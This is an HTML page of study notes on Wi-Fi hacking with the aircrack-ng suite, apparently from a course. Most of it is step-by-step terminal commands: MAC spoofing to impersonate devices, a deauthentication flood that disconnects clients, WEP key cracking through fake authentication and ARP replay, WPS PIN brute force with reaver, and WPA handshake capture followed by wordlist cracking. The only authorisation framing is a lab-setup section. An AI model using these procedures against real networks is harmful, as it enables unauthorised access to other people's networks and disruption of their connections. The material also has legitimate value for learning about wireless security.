<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Information Gathering</title>
    <link href="library/css/Learn_0.css" type="text/css" rel="stylesheet">
    <link rel="preconnect" href="https://fonts.gstatic.com">
    <link href="https://fonts.googleapis.com/css2?family=Zen+Dots&display=swap" rel="stylesheet">
</head>

<body>
    <!-- side navbar-->
    <div id="mySidenav" class="sidenav">
        <a class="closebtn" href="javascript:void(0)" class="closebtn" onclick="closeNav()">&times;</a>
        <a class="admin-items one-top" href="">Main </a>
        <a class="admin-items one-top" href="#labsetup">Lab Setup </a>
        <a class="admin-items one-top" href="#nhack">Network Hacking - Wi-Fi </a>
        <a class="admin-items one-top" href="#mac_change">MAC Change </a>
        <a class="admin-items one-top" href="#wifi_mode_change">Wi-FI mode </a>
        <a class="admin-items one-top" href="#packet_sniff">Packet Sniffing </a>
        <a class="admin-items one-top" href="#deauth_attack">Deauthentication attack</a>
    </div>
    <span id="nav-bar-btn" style="font-size: 30px; cursor: pointer" onclick="openNav()">&#9776;
    </span>
    <!--END    navbar -->

    <header>
        <img src="library/images/kali.jpg" class="banner-img">
    </header>

    <section name="labsetup" id="labsetup">
        <br>
        <h2>LAB SETUP</h2>
        <h3>Steps</h3>
        <ul class="usage">
            <li>Enable virtualization in win 10/11</li>
            <li> Task Manager -&gt; Performance -&gt; check whether virtualization enable or not</li>
            <li>If not enabled, goto BIOS and check any of these options (VT-x,AMD-V,SVM,Vanderpool) available or not
                and if found
                enable it
            </li>
            <li>VirtualBox and KALI Linux Install</li>
            <li>Install terminator</li>
            <pre><code>
    <b class='terminal'>#</b> apt-get install terminator

</code></pre>
        </ul>
    </section>

    <section name="nhack" id="nhack">
        <br>
        <h2>Network Hacking - Wi-Fi </h2>

        <h3>Steps</h3>
        <ul class="usage">
            <li>Pre-connections attacks</li>
            <li>Gaining access</li>
            <li>Post connection attacks</li>
        </ul>
        <h3>Cracking types</h3>
        <ul class="usage">
            <li>Gaining Access -&gt; WEP Cracking</li>
            <li>Gaining access -&gt; WPA2 Cracking</li>
        </ul>
        <h3>Wi-Fi adapter requirements</h3>
        <ul class="usage">
            <li>Monitor mode</li>
            <li>AP mode</li>
            <li>Packet Injection</li>
        </ul>
        <h3>Wi-Fi adapter - recommended</h3>
        <ul class="usage">
            <li>Realtake RTL8812AU , Atheros AR9271 </li>
            <li>AP mode</li>
        </ul>
        <h3>Wi-Fi adapter - setup in virtualBox</h3>
        <ul class="usage">
            <li>Enable USB 1.1</li>
            <li>Check with this command for <strong>wlan0</strong> interface</li>
            <pre><code>
    <b class='terminal'>#</b> ifconfig

</code></pre>
        </ul>
    </section>

    <section name="mac_change" id="mac_change">
        <br>
        <h2>MAC change </h2>

        <h3>What it is?</h3>
        <ul class="usage">
            <li>Media Access Control Address</li>
            <li>Permenant , Physical , Unique</li>
            <li>Format : XX:XX:XX:XX:XX:XX</li>
        </ul>
        <h3>Why change?</h3>
        <ul class="usage">
            <li>Increase anonymity</li>
            <li>Impersonate other device</li>
            <li>Bypass Filter</li>
        </ul>
        <h3>How to change?</h3>
        <ul class="usage">
            <li><strong>ether</strong> is the MAC id</li>
            <pre><code>
    <b class='terminal'>#</b> ifconfig
    <b class='terminal'>#</b> ifconfig wlan0 down
    <b class='terminal'>#</b> ifconfig wlan0 hw ether 00::11::22::33::44::55
    <b class='terminal'>#</b> ifconfig wlan0 up
    <b class='terminal'>#</b> ifconfig 

</code></pre>
            <li>Changes only done in the current machine.Not in Physical device</li>
        </ul>



    </section>


    <section name="wifi_mode_change" id="wifi_mode_change">
        <br>
        <h2>Wi-Fi mode change </h2>

        <h3>Modes</h3>
        <ul class="usage">
            <li>Managed - Capture packets that destination MAC is same as device</li>
            <li>Monitor - Capture all packets</li>
        </ul>

        <h3>How to change?</h3>
        <ul class="usage">
            <li>It ispossible if ond only if the adapter support the monitor mode</li>
            <pre><code>
    <b class='terminal'>#</b> ifconfig
    <b class='terminal'>#</b> ifconfig wlan0 down
    <i class="comment">// Kill currently running processes that using wlan0 interface</i>
    <b class='terminal'>#</b> airmon-ng check kill
    <b class='terminal'>#</b> iwconfig wlan0 mode monitor


</code></pre>

        </ul>

        <h3>is this adapter support monitor mode?</h3>
        <ul class="usage">
            <li>Check the chipset model</li>
            <pre><code>
    <b class='terminal'>#</b> lsusb -vv
    <b class='terminal'>#</b> airmon-ng start wlan0

</code></pre>

        </ul>


    </section>


    <section name="packet_sniff" id="packet_sniff">
        <br>
        <h2>Packet Sniffing </h2>

        <h3>Wi-Fi BANDS</h3>
        <ul class="usage">
            <li>Data can be sniffed from a certain band if the wireless adapter used supports that band.</li>
            <li>Clients need to support band used by router to communiate with it.</li>
            <li>a - 5GHZ</li>
            <li>b,g - 2.4GHz</li>
            <li>n - 5 and 2.4 GHz</li>
            <li>ac - &lt; 6 Ghz</li>
        </ul>

        <h3>In Windows - Microsoft Network Monitor</h3>
        <ul class="usage">
            <li><a href="https://www.microsoft.com/en-in/download/details.aspx?id=4865">Download Microsoft Network
                    Monitor</a></li>
            <li>Install & Run as Administrator</li>
            <li>New capture</li>
            <li>Capture settings - wi-fi</li>
            <li>Start</li>
        </ul>

        <h3>use AIRODUMP-NG</h3>
        <ul class="usage">
            <li>Part of aircrack-ng suit</li>
            <li>Capture all packets within range</li>
            <li>Detailed info about network around us</li>
            <li>Connected clients</li>
        </ul>
        <pre><code>
    <b class='terminal'>#</b> iwcofig

    <i class="comment">// mon0 - The name of the interface that is in monitor mode.</i>
    <b class='terminal'>#</b> airodump-ng mon0

    <i class="comment">// Get 5GHz also</i>
    <b class='terminal'>#</b> airodump-ng --band a mon0

    <i class="comment">// Get 2.4 and 5 GHz also</i>
    <b class='terminal'>#</b> airodump-ng --band abg mon0

    <i class="comment">// pass - (BSSID & CH) ,  write to file</i>
    <b class='terminal'>#</b> airodump-ng --bssid 00::11::22::33::44::55 --channel 2 --write test mon0
    
    <i class="comment">// Run wireshark and open the test-01.cap file and check the data.</i>
    <b class='terminal'>#</b> wireshark

</code></pre>

    </section>


    <section name="deauth_attack" id="deauth_attack">
        <br>
        <h2>Deauthentication Attack </h2>

        <h3>What?</h3>
        <ul class="usage">
            <li>Disonnect any client from any network</li>
            <li>Works on encrypted network(WEP,WPA&WPA2)</li>
            <li>No need to know the network key</li>
            <li>No need to connect to the network</li>
            <li>Idea - The attacker pretends to be the client by changing the mac address to the client and telling to
                the router to disconnect.
                Then again, the attacker pretends to be the router by changing the mac address to the router and telling
                the client that your disconnect request succeeded.
            </li>
        </ul>
        <h3>USE AIRPLAY-NG</h3>
        <pre><code>
    <i class="comment">// a - target / router , c - client , 100000000 - no of packets</i>
    <b class='terminal'>#</b> aireplay-ng --deauth 100000000 -a F8:23:B2:B9:50:AB -c F9:24:B3:B0:51:AC mon0

    <i class="comment">// In another terminal</i>
    <b class='terminal'>#</b> airodump-ng --bssid F9:24:B3:B0:51:AC --channel 2 mon0
        
</code></pre>

    </section>


    <section name="wep" id="wep">
        <br>
        <h2>WEP Cracking (Gaining Access )</h2>

        <h3>About?</h3>
        <ul class="usage">
            <li>Wired Equivalent Privacy</li>
            <li>Old encryption</li>
            <li>RC4 - algorithm</li>
            <li>Still uses in some networks. can be cracked easily </li>
            <li>client/router - send/recieve - encrypt/decrypt packets by using a key</li>
        </ul>

        <h3>Vulnerability?</h3>
        <ul class="usage">
            <li>Each packet is encrypted using a unique key stream</li>
            <li>Random initialization vector(IV) is used to generate the keys streams</li>
            <li>IV is only 24 bits</li>
            <li>IV + key(password) = key stream </li>
            <li>client/router - send/recieve - encrypt/decrypt packets by using a key</li>
            <li>IV is sent in plaintext</li>
            <li>IV will repeat on busy networks. This makes WEP vulnerable to statistical attacks</li>
            <li>Repeated IV can be used to determine the key stream and break the encryption</li>
        </ul>
        <h3>AIRODUMP-NG & aircrack-ng</h3>
        <ul class="usage">
            <li>Capture a large number of packets / IVs</li>
            <li>Analyse the captured IVs and crack the key</li>
        </ul>
        <pre><code>
    <i class="comment">// collect packets</i>
    <b class='terminal'>#</b> airodump-ng --bssid F9:24:B3:B0:51:AC --channel 2 --write basic_wep mon0

    <i class="comment">// To crack key</i>
    <b class='terminal'>#</b> aircrack-ng basic_wep-01.cap

</code></pre>
        <ul class="usage">
            <li>Copy the key and remove all columns - this is the password of Wi-Fi</li>
            <li>Problem - If network not busy, It would take some time to capture enough IVs</li>
            <li>Solution - Force the AP to generate new IVs</li>
        </ul>
        <h3>Fake Authentication attack</h3>
        <ul class="usage">
            <li>Force the AP to generate new IVs</li>
        </ul>
        <pre><code>
    <i class="comment">// collect packets</i>
    <b class='terminal'>#</b> airodump-ng --bssid F9:24:B3:B0:51:AC --channel 2 --write arpreplay mon0

    <i class="comment">// a - target , h - your device (ifconfig - first 12 digits of unspec - change '-' to ':')</i>
    <b class='terminal'>#</b> aireplay-ng --fakeauth 0 -a F9:24:B3:B0:51:AC -h F2:34:B4:B0:61:BC mon0

    <i class="comment">// To crack key</i>
    <b class='terminal'>#</b> aircrack-ng arpreplay-01.cap

</code></pre>
        <h3>ARP Request Replay attack</h3>
        <ul class="usage">
            <li>Force the AP to generate new IVs</li>
            <li>Wait for an ARP packet , capture it and replay(retransmit) it</li>
            <li>This causes the AP to produce another packet with a new IV</li>
            <li>Keep doing this till we have enough IVs to crack the key</li>
        </ul>
        <pre><code>
    <i class="comment">// collect packets</i>
    <b class='terminal'>#</b> airodump-ng --bssid F9:24:B3:B0:51:AC --channel 2 --write arpreplay mon0

    <i class="comment">// b - target , h - your device (ifconfig - first 12 digits of unspec - change '-' to ':')</i>
    <b class='terminal'>#</b> aireplay-ng --arpreplay -b F9:24:B3:B0:51:AC -h F2:34:B4:B0:61:BC mon0

    <i class="comment">// To crack key</i>
    <b class='terminal'>#</b> aircrack-ng arpreplay-01.cap

</code></pre>

    </section>


    <section name="wpa" id="wpa">
        <br>
        <h2>WPA / WPA 2 Cracking</h2>

        <h3>About?</h3>
        <ul class="usage">
            <li>Both can be cracked using the same methods</li>
            <li>Made to address the issue in WEP</li>
            <li>Much more secure</li>
            <li>Each packet is encrypted using a unique temporary key </li>
        </ul>
        <h3>Vulnerability?</h3>
        <ul class="usage">
            <li>WPS is a feature that can be used with WPA&WPA2</li>
            <li>Allows clients to connect without the password</li>
            <li>Authentication is done using an 8 digit pin</li>
            <li>8 digits is very small, we can try all possible pins in relatively short time. Then the wps pin can be
                used to compute the actual password.</li>
            <li>This only works if the router is configured not to use PBC (Push Button Authentication)</li>
        </ul>
        </code></pre>
        <h3>Reaver - use if WPS enabled</h3>
        <ul class="usage">
            <li>Find the devices with WPS enabled and attack</li>
        </ul>
        <pre><code>
    <i class="comment">// collect packets</i>
    <b class='terminal'>#</b> wash --interface mon0

    <i class="comment">// b - target , h - your device (ifconfig - first 12 digits of unspec - change '-' to ':')</i>
    <b class='terminal'>#</b> aireplay-ng --fakeauth 30 -a F9:24:B3:B0:51:AC -h F2:34:B4:B0:61:BC mon0

    <i class="comment">// To crack key , vvv - more info</i>
    <b class='terminal'>#</b> reaver --bssid F9:24:B3:B0:51:AC --channel 1 --interface mon0 -vvv 

</code></pre>

        <h3>Wordlist attack - use if WPS disabled</h3>
        <ul class="usage">
            <li>Only packets that can aid with the cracking process are the handshake packets</li>
            <li>Need to wait for a client connection to the target AP</li>
            <li>Can use deauthentication attack for a client connection</li>
            <li>Capture the 4-way handshake</li>
        </ul>
        <pre><code>
    <i class="comment">// collect packets</i>
    <b class='terminal'>#</b> airodump-ng --bssid F9:24:B3:B0:51:AC --channel 2 --write wpa_handshake mon0

    <i class="comment">// b - target , h - your device (ifconfig - first 12 digits of unspec - change '-' to ':')</i>
    <b class='terminal'>#</b> aireplay-ng --deauth 4 -a F9:24:B3:B0:51:AC -c F2:34:B4:B0:61:BC mon0

</code></pre>

        <ul class="usage">
            <li>The handshake does not contain data that helps recover the key.</li>
            <li>It contains data that can be used to check if a key is valid or not.</li>
            <li>Create a wordlist of password and check the password valid or not</li>
        </ul>
        <pre><code>
    <i class="comment">// To create a wordlist</i>
    <i class="comment">// crunch [min][max][charactres] -t [pattern] -o [filename]</i>
    <b class='terminal'>#</b> crunch 6 8 123abc$ -o wordlist -t a@@@@b

</code></pre>
        <ul class="usage">
            <li>The password and handshake-packets data combine and generate MIC code then check match with MIC within
                the packet.</li>
        </ul>
        <pre><code>
    <i class="comment">// To get the password</i>
    <b class='terminal'>#</b> aircrack-ng wpa_handshake-01.cap -w test.txt

</code></pre>
    </section>

    <div style="overflow-x:auto;">
    </div>
    <br><br><br>
    <footer>

    </footer>
    <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js"
        integrity="sha384-DfXdz2htPH0lsSSs5nCTpuj/zy4C+OGpamoFVy38MVBnE+IbbVYUew+OrCXaRkfj"
        crossorigin="anonymous"></script>
    <script src="library/js/information_gathering.js"></script>
</body>

</html>